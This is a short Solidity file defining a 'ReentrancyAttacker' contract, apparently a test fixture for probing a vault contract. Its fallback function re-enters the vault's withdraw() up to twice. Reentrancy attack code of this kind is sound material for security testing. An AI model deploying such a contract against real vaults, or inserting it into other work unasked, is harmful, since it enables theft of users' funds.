// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title ReentrancyAttacker
 * @notice Reentrancy attack contract
 * @dev Attempt to manipulate state via reentrancy
 */
contract ReentrancyAttacker {
    address public vault;
    uint256 public attackCount;
    
    constructor(address _vault) {
        vault = _vault;
    }
    
    function attack() external {
        // Try common reentrancy vectors
        (bool success,) = vault.call{value: 0}("");
        attackCount++;
    }
    
    fallback() external payable {
        if (attackCount < 2) {
            attackCount++;
            // Attempt to call vault functions during reentrancy
            (bool success,) = vault.call(abi.encodeWithSignature("withdraw()"));
        }
    }
    
    receive() external payable {}
}
